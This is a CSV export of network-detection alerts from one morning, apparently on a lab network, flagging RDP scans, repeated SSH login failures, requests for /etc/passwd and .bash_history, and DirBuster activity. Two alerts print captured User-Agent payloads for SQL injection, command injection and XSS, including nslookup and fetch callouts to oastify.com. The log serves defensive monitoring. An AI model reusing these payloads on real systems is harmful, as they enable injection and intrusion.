SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,30069,2025-03-28T09:18:17Z,Communication,Configuration,Detected 11 RDP New Comms between 2025-03-28T09:14:24.792Z and 2025-03-28T09:18:17.914Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.5.29, 10.0.6.29, 10.0.7.30, 10.0.7.29, 10.0.6.30, 10.0.12.29, 10.0.6.11, 10.0.6.12, 10.0.5.30;
  dst_asset_id: 1680, 1898, 1910, 1936, 1746, 1704, 1914;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.7.30, 10.0.6.29, 10.0.5.29, 10.0.7.29, 10.0.6.30, 10.0.5.30, 10.0.12.30;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1680, 1898, 1737, 1936, 1746, 1754, 1810, 1704, 1914;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , PLUMETECH, nmap, nina, kali, devel;
  src__ip: ;",RDP New Comms Pattern,"1936,1704,1910,1680,1914,1746,1898,1754,1737,1810",,,"10.0.5.30,10.0.5.29,10.0.7.29,10.0.7.30,10.0.6.29,10.0.6.30,10.0.6.11,10.0.12.29,10.0.6.12","10.0.5.30,10.0.5.29,10.0.12.30,10.0.7.29,10.0.7.30,10.0.6.29,10.0.6.30",,,
Medium,30156,2025-03-28T09:43:39Z,Indicator,Threat Behavior,HTTP Request /etc/hosts,HTTP Request /etc/hosts,HTTP Hunting Signatures,"1841,1914",,,10.0.7.30,10.0.7.12,,Network Traffic,
Low,30290,2025-03-28T09:32:59Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1914 (10.0.7.30) to then pivot to asset 1841 (10.0.7.12) via TELNET.,Interactive Session Pivots,"1841,2896",,,10.0.242.127,10.0.7.12,,,
Low,30306,2025-03-28T09:36:30Z,Communication,Configuration,RDP New Cookie,New RDP cookie User1 from host 10.0.7.44 (asset 1768) to host 10.0.7.30 (asset 1914).,RDP New Cookie,"1914,1768",,,10.0.7.44,10.0.7.30,,,
Low,30307,2025-03-28T09:37:40Z,Communication,Configuration,Detected 8 RDP New Comms between 2025-03-28T09:32:25.673Z and 2025-03-28T09:37:40.691Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.7.30, 10.0.5.11, 10.0.1.29, 10.0.10.30, 10.0.10.29, 10.0.7.44, 10.0.5.30, 10.0.5.12;
  dst_asset_id: 1697, 1936, 1801, 1919, 1768, 1914, 151;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.7.30, 10.0.10.30, 10.0.1.30, 10.0.10.29, 10.0.7.44, 10.0.5.30, 10.0.5.12;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 44, 1699, 1936, 1801, 1919, 1768, 1697, 1914;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , nmap, User1, alice;
  src__ip: ;",RDP New Comms Pattern,"1919,151,44,1914,1801,1936,1697,1768,1699",,,"10.0.10.30,10.0.1.29,10.0.7.30,10.0.10.29,10.0.5.30,10.0.5.12,10.0.7.44,10.0.5.11","10.0.10.30,10.0.1.30,10.0.7.30,10.0.10.29,10.0.5.30,10.0.5.12,10.0.7.44",,,
Low,30339,2025-03-28T09:30:39Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,22816292-b7f2-4395-91fa-46df1443b0fe,
Low,30352,2025-03-28T08:36:01Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,d147f90b-228d-499f-89ef-145360db6619,
Low,30356,2025-03-28T08:32:34Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,a344af5a-74fc-4da1-ab27-ea75ee925127,
Low,30413,2025-03-28T09:14:24Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.7.29 (1680) (Enterprise Management/Server) received RDP traffic from 10.0.7.30 (1914).,RDP to Enterprise Management Asset,"1914,1680",,,10.0.7.30,10.0.7.29,,f02d1aea-64fc-4f25-93e4-dd585a74253a,
Low,30415,2025-03-28T09:36:01Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.7.44 (1768) (Enterprise Management/Server) received RDP traffic from 10.0.7.30 (1914).,RDP to Enterprise Management Asset,"1914,1768",,,10.0.7.30,10.0.7.44,,3db97a24-cb02-4148-a6fb-25694b530160,
Low,31594,2025-03-28T08:58:08Z,Communication,Configuration,New Global User Agent,User Agent 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (10.0.7.12).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,00180055-284e-4106-aac3-7e88aa5792aa,
Low,31638,2025-03-28T09:14:24Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.7.30 (1914) to host 10.0.7.29 (1680). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1914,1680",,,10.0.7.30,10.0.7.29,,,
Low,31639,2025-03-28T09:14:24Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.7.29 (1680) to host 10.0.7.30 (1914). If unencrypted, may also include the RDP cookie (kali), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1914,1680",,,10.0.7.29,10.0.7.30,,,
Low,31652,2025-03-28T09:36:30Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.7.44 (1768) to host 10.0.7.30 (1914). If unencrypted, may also include the RDP cookie (User1), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1914,1768",,,10.0.7.44,10.0.7.30,,,
Low,31654,2025-03-28T09:36:01Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.7.30 (1914) to host 10.0.7.44 (1768). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1914,1768",,,10.0.7.30,10.0.7.44,,,
Low,32248,2025-03-28T09:59:31Z,Indicator,Indicator,HTTP Request for .hta File,HTTP Request for .hta File,HTTP Request for File Extension,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Low,32262,2025-03-28T09:59:21Z,Indicator,Threat Behavior,HTTP Request .bash_history,HTTP Request .bash_history,HTTP Hunting Signatures,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Low,32263,2025-03-28T09:59:21Z,Indicator,Indicator,HTTP Request for .hta File,HTTP Request for .hta File,HTTP Request for File Extension,"1914,1772",,,10.0.7.30,10.0.7.11,,Network Traffic,
Low,32265,2025-03-28T09:59:31Z,Communication,Indicator,Failed HTTP Logon,"Asset 1772 (10.0.7.11) returned an HTTP response code of 403 'Forbidden' to asset 1914 (10.0.7.30), which represents a failed logon attempt via HTTP by asset 1914. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1914,1772",,,10.0.7.11,10.0.7.30,,b2e741c6-0153-4a08-928b-a4f1ecdb64f2,
Low,32267,2025-03-28T09:50:04Z,Communication,Indicator,Failed HTTP Logon,"Asset 1772 (10.0.7.11) returned an HTTP response code of 401 'Unauthorized' to asset 1914 (10.0.7.30), which represents a failed logon attempt via HTTP by asset 1914. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1914,1772",,,10.0.7.11,10.0.7.30,,2d1e4dd5-b32a-4265-ac3a-7dc436a9efd3,
Low,32292,2025-03-28T09:32:14Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,a157094f-88d1-4b6d-a6a1-56ac5fa807fc,
Low,32294,2025-03-28T09:30:42Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,fef6a9b6-adb5-459c-990e-b4ae6af6ef43,
Low,32296,2025-03-28T09:18:44Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,0e07d9ac-7a01-466f-8477-32afeb97a48f,
Low,32307,2025-03-28T08:46:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,e6894310-e0e3-4259-a281-5199f7f2d75e,
Low,32320,2025-03-28T09:44:31Z,Communication,Configuration,New SMB Communication detected,New SMB_TreeInfo (version: ) traffic between Asset:1841 and Asset:1772,New SMB Communication Detection,"1772,1841",,,10.0.7.12,10.0.7.11,,c122ed0a-a52c-4282-883e-d3cfee922831,
Low,32321,2025-03-28T09:50:10Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1680 and Asset:1914,New SMB Communication Detection,"1914,1680",,,10.0.7.29,10.0.7.30,,2f59dde1-83e2-4b34-ba36-7638ce014f9f,
Low,32328,2025-03-28T09:57:39Z,Communication,Configuration,New Global User Agent,User Agent 'DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,000036ac-ebf1-425f-abaa-74ce55cf9786,
Low,32329,2025-03-28T09:57:39Z,Asset,Configuration,User-Agent First Seen from Host,Asset 1914 made an HTTP request with User-Agent DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) for the first time.,User Agent First Seen,1914,,,,,10.0.7.30,000036ac-ebf1-425f-abaa-74ce55cf9786,
Low,32384,2025-03-28T10:12:03Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,7d1f4086-fac6-4afb-9573-e7434278b0bf,
Low,32398,2025-03-28T10:03:06Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,929aea2d-3848-4898-97d1-edd0a7483e7d,
Low,32401,2025-03-28T09:42:06Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,6843ed56-d80d-4183-9306-89fea5547e61,
Low,32403,2025-03-28T09:37:12Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,9c96bc75-c18c-4e4f-8abb-20d9a3be5ced,
Low,32404,2025-03-28T09:27:08Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,48e17ea2-886d-468d-a02e-9b051d208dac,
Low,32405,2025-03-28T09:28:06Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,6714f0e1-49b0-4b8a-9602-df623ea423fa,
Low,32406,2025-03-28T09:25:54Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,8c2acff8-34a8-4e95-8f49-564042b97a5a,
Low,32407,2025-03-28T09:10:38Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,0750b43c-4505-411f-9163-a85dfcd2fbc2,
Low,32408,2025-03-28T09:11:17Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,74774dd0-3d1e-4778-b248-1cf71990c7a2,
Low,32413,2025-03-28T08:46:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,4c303905-4945-410c-a748-ad3036d407e4,
Low,32559,2025-03-28T10:14:14Z,Indicator,Indicator,DNS Query to Suspicious TLD .download,DNS Query to Suspicious TLD .download,Suspicious TLD Signatures,"1914,69",,,10.0.7.30,8.8.8.8,,Network Traffic,
Low,32560,2025-03-28T10:14:14Z,Indicator,Indicator,DNS Query to Suspicious TLD .download,DNS Query to Suspicious TLD .download,Suspicious TLD Signatures,"1914,69",,,10.0.7.30,8.8.8.8,,Network Traffic,
Low,32561,2025-03-28T10:14:15Z,Indicator,Indicator,HTTP Request to Suspicious TLD .download,HTTP Request to Suspicious TLD .download,Suspicious TLD Signatures,"1914,2660",,,10.0.7.30,104.17.254.239,,Network Traffic,
Low,32562,2025-03-28T10:14:15Z,Indicator,Indicator,HTTP Request to Suspicious TLD .download,HTTP Request to Suspicious TLD .download,Suspicious TLD Signatures,"1914,2660",,,10.0.7.30,104.17.254.239,,Network Traffic,
Low,32595,2025-03-28T10:15:59Z,Indicator,Threat Behavior,HTTP URI CLI Command nslookup,HTTP URI CLI Command nslookup,HTTP Hunting CLI Signatures,"1914,1841",,,10.0.7.30,10.0.7.12,,Network Traffic,
Medium,32605,2025-03-28T10:16:30Z,Indicator,Threat Behavior,HTTP Request /etc/passwd,HTTP Request /etc/passwd,HTTP Hunting Signatures,"1841,1914",,,10.0.7.30,10.0.7.12,,Network Traffic,
Low,32606,2025-03-28T10:15:49Z,Indicator,Threat Behavior,HTTP Request Host localhost,HTTP Request Host localhost,HTTP Hunting Signatures,"1841,1914",,,10.0.7.30,10.0.7.12,,Network Traffic,
Low,32612,2025-03-28T10:16:43Z,Indicator,Indicator,HTTP Request for .jar File,HTTP Request for .jar File,HTTP Request for File Extension,"1841,1914",,,10.0.7.30,10.0.7.12,,Network Traffic,
Low,32613,2025-03-28T10:16:46Z,Indicator,Indicator,HTTP Request for .jar File,HTTP Request for .jar File,HTTP Request for File Extension,"1841,1914",,,10.0.7.30,10.0.7.12,,Network Traffic,
Low,32712,2025-03-28T10:25:03Z,Communication,Indicator,Failed HTTP Logon,"Asset 1772 (10.0.7.11) returned an HTTP response code of 401 'Unauthorized' to asset 1914 (10.0.7.30), which represents a failed logon attempt via HTTP by asset 1914. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1772,1914",,,10.0.7.11,10.0.7.30,,da96c73b-7ec4-40f7-bcd0-8014f11426e5,
Low,32715,2025-03-28T10:16:26Z,Communication,Indicator,Failed HTTP Logon,"Asset 1841 (10.0.7.12) returned an HTTP response code of 403 'Forbidden' to asset 1914 (10.0.7.30), which represents a failed logon attempt via HTTP by asset 1914. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1914,1841",,,10.0.7.12,10.0.7.30,,0b552d0c-7cb7-49bf-904b-b7bfe7a3291e,
Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  src__mac: ;
  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32770,2025-03-28T10:26:24Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1772 and Asset:1914,New SMB Communication Detection,"1772,1914",,,10.0.7.11,10.0.7.30,,7f030111-ed47-4aea-914f-ccd08ae4a10f,
Low,32774,2025-03-28T10:19:46Z,Communication,Configuration,Detected 93 New Global User Agent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:19:46.276Z,"Sample New Global User Agent values include:
  dst__port: ('',);
  dst_asset_id: 1841, 1697, 1829, 1742;
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  dst_ip: 10.0.12.11, 10.0.5.12, 10.0.7.12, 10.0.4.12;
  src__mac: ;
  src_ip: 10.0.4.30, 10.0.7.30, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1910, 1905, 1914, 1936;
  dst__ip: ;
  host: 10.0.12.11, oastify.com, 10.0.4.12, 10.0.5.12, localhost;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|echo cxshsd7ofj sqooozn4bw||a #' |echo cxshsd7ofj sqooozn4bw||a #|"" |echo cxshsd7ofj sqooozn4bw||a #, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3671263895' or '9441'='9442;
  src__ip: ;",User Agent First Seen Globally,"1914,1742,1910,1841,1905,1936,1697,1829",,,"10.0.7.30,10.0.12.30,10.0.4.30,10.0.5.30","10.0.12.11,10.0.7.12,10.0.5.12,10.0.4.12",,"d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32831,2025-03-28T10:37:39Z,Communication,Configuration,Detected 21 NewX509Certificate between 2025-03-28T10:26:38.369Z and 2025-03-28T10:37:39.407Z,"Sample NewX509Certificate values include:
  server: 23.3.89.120, 23.11.206.112, 23.11.206.104, 142.250.185.138, 184.25.50.200, 98.64.238.3, 40.126.31.2, 104.208.16.92, 23.32.238.99, 23.32.238.96;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
  server_asset_id: 3811, 1772, 3831, 3825, 3830, 1779, 3817, 3828, 3816, 3785;
  dst__port: ('',);
  dns: ;
  uuid: 460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb;
  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
  client_asset_id: 1905, 48, 1916, 1746, 1729, 1704, 1914;
  src__mac: ;
  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.5.29, 10.0.6.29, 10.0.7.30, 10.0.4.30, 10.0.8.30, 10.0.2.11, 10.0.9.29;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"1914,1772,48,1729,1704,1916,1905,3831,3830,3825,3828,3811,1779,3817,3816,3785,1746",,,"10.0.7.11,184.25.50.161,20.189.173.24,98.64.238.3,40.90.65.40,23.3.89.120,10.0.8.11,23.11.206.98,184.25.50.200,23.11.206.112","10.0.7.30,10.0.2.11,10.0.9.29,10.0.5.29,10.0.8.30,10.0.4.30,10.0.6.29",,"460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb",
Low,32835,2025-03-28T10:31:42Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.30.,SSH Authentication Failure,"1914,2896",,,10.0.242.127,10.0.7.30,,32b070e2-e8ff-402b-8b65-384727d7bdd1,
Low,32840,2025-03-28T10:30:36Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.7.60.,SSH Authentication Failure,"2896,1839",,,10.0.242.127,10.0.7.60,,102a486d-8d84-47fe-b97e-b7bd7768c668,
